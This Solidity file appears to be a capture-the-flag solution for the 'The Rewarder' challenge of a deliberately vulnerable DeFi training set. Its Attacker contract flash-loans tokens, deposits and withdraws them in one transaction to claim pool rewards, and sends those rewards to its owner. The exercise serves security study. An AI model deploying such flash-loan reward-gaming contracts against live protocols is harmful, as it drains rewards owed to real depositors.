// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {TheRewarderPool} from "src/Contracts/the-rewarder/TheRewarderPool.sol";
import {FlashLoanerPool} from "src/Contracts/the-rewarder/FlashLoanerPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "src/Contracts/the-rewarder/RewardToken.sol";
import "forge-std/Test.sol";

contract Attacker {
    address owner;
    TheRewarderPool theRewarderPool;
    FlashLoanerPool flashLoanerPool;
    RewardToken rewardToken;
    DamnValuableToken public immutable liquidityToken;

    constructor(address _theRewarderPool, address _liquidityToken, address _flashLoanerPool, address _rewardToken) {
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function doFlashLoan(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

    function withdrawRewardToken() external {
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
